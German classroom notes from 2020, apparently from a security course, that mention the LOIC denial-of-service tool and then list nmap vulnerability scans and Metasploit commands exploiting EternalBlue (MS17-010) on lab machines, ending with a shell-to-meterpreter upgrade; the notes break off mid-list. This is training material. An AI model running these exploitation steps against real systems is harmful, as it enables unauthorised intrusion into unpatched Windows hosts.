# **Mitschrift**
#### Datum: 29.04.2020
### **Thema: gesetzliche Angelegeneheiten**
[Artikel Zur Strafe heise.de](https://www.heise.de/ix/artikel/Zur-Strafe-1892408.html?artikelseite=&view=)

---
### **Thema: TCP** 
![img](https://upload.wikimedia.org/wikipedia/commons/thumb/9/98/Tcp-handshake.svg/1024px-Tcp-handshake.svg.png)

![img2](https://2.bp.blogspot.com/-Q1OvitIDVFE/T9opuETUwcI/AAAAAAAACB4/T1TaXfGxj94/s1600/Low-Orbit-Ion-Cannon.png)


- Ist ein "**nicht legales** Tool" für Dos-Angriffe **"Benutzung auf eigene Gefahr"**
[![IMAGE ALT TEXT](https://tse2.mm.bing.net/th?id=OIP.szMmUNZjK6gT6qrs8uhk9QHaD4&pid=Api)](https://youtu.be/Bbrkc7AXtKg "Video Title")
- Tutorial 
---

### **Sonnleiter Era**
 ``` 
- sudo openvpn exotechly.ovpn &
- ip a
- 10.9.41.189
- nmap 10.10.125.160 | tee nmap-standard 
- nmap --script vuln -p 135,139,445 10.9.41.189 
  - um herauszufinden ob es sich um eine Windows Maschine handelt 
- nmap --script vuln -p 135,149,445 10.10.227.183 |tee nmap-vuln
 ```
# Zweite Session 

```
1. nmap -sV -sC --script vuln -oN blue.nmap 10.10.137.78
2. msfconsole
3. search ms17
4. search eternal
5. use 3 
6. show options
7. set rhosts 10.10.73.63
=> remote host (target)
8. run 
9.C:\Windows\system32>
Optional
set rhots 10.10.201.164
run
exploit
show options
set LPORT 4445
```
## Task 3
```
1. use post/multi/manage/shell_to_meterpreter
2. show options
3. set session 1
4. run 
5. session 
6. sessions 
=> wir sollten jetzt eine 2 Session haben. 
7. sessions -i 2
=> Startet eine Interaktion 
8.  


